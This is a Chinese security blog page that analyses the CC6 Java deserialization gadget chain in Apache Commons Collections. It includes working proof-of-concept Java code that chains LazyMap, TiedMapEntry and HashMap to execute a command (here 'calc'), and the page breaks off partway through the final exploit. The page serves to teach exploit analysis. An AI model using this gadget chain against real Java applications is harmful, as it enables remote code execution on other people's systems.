@@ -1,0 +1,310 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  java反序列化之CC6
+  #
+
+
+  CC6 链分析
+  #
+
+前半段链子，从LazyMap到InvokerTransformer类是一样的。
+我们直接从LazyMap开始找其他调用get的地方。
+
+  寻找链子
+  #
+
+在 ysoSerial 给的链子中，是TiedMapEntry的getValue()方法调用了LazyMap的get()方法。
+再来一次LazyMap弹出计算器的方法：
+package org.example.originaltest;
+
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC6Test {
+    public static void main(String[] args) {
+
+        Runtime runtime = Runtime.getRuntime();
+
+        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
+
+        HashMap<Object, Object> map = new HashMap<>();
+        Map decorate = LazyMap.decorate(map, exec);
+
+        decorate.get(runtime);
+    }
+}
+下一步就是让TiedMapEntry类中的getValue()方法调用了LazyMap的get()方法。下面使用TiedMapEntry写一个exp。
+package org.example.originaltest;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC6Test {
+    public static void main(String[] args) throws Exception{
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap<Object, Object> map = new HashMap<>();
+        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
+        tiedMapEntry.getValue();
+        
+    }
+}
+这里的逻辑还是很简单的，我们创建一个TiedMapEntry对象，然后把我们构造的LazyMap传进去并直接调用setValue方法，就会调用到map.get(key)。'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/"><meta property="og:site_name" content="S0lowalker"><meta property="og:title" content="java反序列化之CC6"><meta property="og:description" content='java反序列化之CC6 # CC6 链分析 # 前半段链子，从LazyMap到InvokerTransformer类是一样的。
+我们直接从LazyMap开始找其他调用get的地方。
+寻找链子 # 在 ysoSerial 给的链子中，是TiedMapEntry的getValue()方法调用了LazyMap的get()方法。
+再来一次LazyMap弹出计算器的方法：
+package org.example.originaltest; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; public class CC6Test { public static void main(String[] args) { Runtime runtime = Runtime.getRuntime(); InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}); HashMap<Object, Object> map = new HashMap<>(); Map decorate = LazyMap.decorate(map, exec); decorate.get(runtime); } } 下一步就是让TiedMapEntry类中的getValue()方法调用了LazyMap的get()方法。下面使用TiedMapEntry写一个exp。
+package org.example.originaltest; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; public class CC6Test { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}), new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap<Object, Object> map = new HashMap<>(); Map lazyMap = LazyMap.decorate(map, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key"); tiedMapEntry.getValue(); } } 这里的逻辑还是很简单的，我们创建一个TiedMapEntry对象，然后把我们构造的LazyMap传进去并直接调用setValue方法，就会调用到map.get(key)。'><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-05-13T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-13T00:00:00+00:00"><meta property="article:tag" content="Java安全"><meta property="article:tag" content="反序列化专题"><meta property="article:tag" content="CC链"><title>java反序列化之CC6 | S0lowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/><link rel=stylesheet href=/book.min.31c453d41ba8febf45a3c125de02ecdbd5a000186bc220da3d8ade8f54ed6ec1.css integrity="sha256-McRT1Buo/r9Fo8El3gLs29WgABhrwiDaPYrej1TtbsE=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.f3b8735e92aacb11c612456ae889aa7fadc9da7bad1b75639d6dd000d07b5fc7.js integrity="sha256-87hzXpKqyxHGEkVq6Imqf63J2nutG3VjnW3QANB7X8c=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><a href=https://s0lowalker.github.io/ class=top-header-title>S0lowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>S0lowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li><li><input type=checkbox id=section-c47aa3d5834730def37f0c0296806937 class=toggle checked>
+<label for=section-c47aa3d5834730def37f0c0296806937 class="flex justify-between"><a role=button>Java反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/ class=active>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li><li><a href=/docs/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>java反序列化之CC6</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#cc6-链分析>CC6 链分析</a><ul><li><a href=#寻找链子>寻找链子</a></li><li><a href=#与入口类结合的链子>与入口类结合的链子</a></li><li><a href=#最终-exp>最终 EXP</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=java反序列化之cc6>java反序列化之CC6
+<a class=anchor href=#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc6>#</a></h1><h2 id=cc6-链分析>CC6 链分析
+<a class=anchor href=#cc6-%e9%93%be%e5%88%86%e6%9e%90>#</a></h2><p>前半段链子，从<code>LazyMap</code>到<code>InvokerTransformer</code>类是一样的。</p><p>我们直接从<code>LazyMap</code>开始找其他调用<code>get</code>的地方。</p><h3 id=寻找链子>寻找链子
+<a class=anchor href=#%e5%af%bb%e6%89%be%e9%93%be%e5%ad%90>#</a></h3><p>在 ysoSerial 给的链子中，是<code>TiedMapEntry</code>的<code>getValue()</code>方法调用了<code>LazyMap</code>的<code>get()</code>方法。</p><p>再来一次<code>LazyMap</code>弹出计算器的方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.originaltest;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC6Test</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Runtime runtime <span style=color:#f92672>=</span> Runtime.<span style=color:#a6e22e>getRuntime</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        InvokerTransformer exec <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map decorate <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, exec);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        decorate.<span style=color:#a6e22e>get</span>(runtime);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>下一步就是让<code>TiedMapEntry</code>类中的<code>getValue()</code>方法调用了<code>LazyMap</code>的<code>get()</code>方法。下面使用<code>TiedMapEntry</code>写一个exp。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.originaltest;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC6Test</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>,<span style=color:#66d9ef>null</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>,Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#66d9ef>null</span>,<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>})
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(map, chainedTransformer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        TiedMapEntry tiedMapEntry <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TiedMapEntry(lazyMap, <span style=color:#e6db74>&#34;key&#34;</span>);
+</span></span><span style=display:flex><span>        tiedMapEntry.<span style=color:#a6e22e>getValue</span>();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这里的逻辑还是很简单的，我们创建一个<code>TiedMapEntry</code>对象，然后把我们构造的<code>LazyMap</code>传进去并直接调用<code>setValue</code>方法，就会调用到<code>map.get(key)</code>。</p><p>接下来向上找谁调用了<code>TiedMapEntry</code> 中的 <code>getValue()</code> 方法。</p><p><code>getvalue</code>这一个方法非常常见，所以一般优先找同一个类下面是否存在调用。</p><p>于是找到在这个类下<code>hashCode()</code>方法中调用了<code>getValue()</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span>() {
+</span></span><span style=display:flex><span>        Object value <span style=color:#f92672>=</span> getValue();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (getKey() <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> 0 : getKey().<span style=color:#a6e22e>hashCode</span>()) <span style=color:#f92672>^</span>
+</span></span><span style=display:flex><span>               (value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> 0 : value.<span style=color:#a6e22e>hashCode</span>()); 
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>在实战中，如果我们在链子中找到了<code>hashCode()</code>方法，说明链子的构造已经快成功了。</p><h3 id=与入口类结合的链子>与入口类结合的链子
+<a class=anchor href=#%e4%b8%8e%e5%85%a5%e5%8f%a3%e7%b1%bb%e7%bb%93%e5%90%88%e7%9a%84%e9%93%be%e5%ad%90>#</a></h3><p>在 Java 反序列化中，找到<code>hashCode()</code>之后的链子基本都是<code>HashMap</code>这一条。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>xxx.<span style=color:#a6e22e>readObject</span>()
+</span></span><span style=display:flex><span>	HashMap.<span style=color:#a6e22e>put</span>() <span style=color:#f92672>--</span>自动调用<span style=color:#f92672>--&gt;</span>   HashMap.<span style=color:#a6e22e>hash</span>()
+</span></span><span style=display:flex><span>		后续利用链.<span style=color:#a6e22e>hashCode</span>()
+</span></span></code></pre></div><p>写一段从<code>HashMap.put</code>开始到<code>InvokerTransformer</code>结尾的弹计算器的exp：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.originaltest;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CC6Test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>unserialize</span>(String filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(filename));
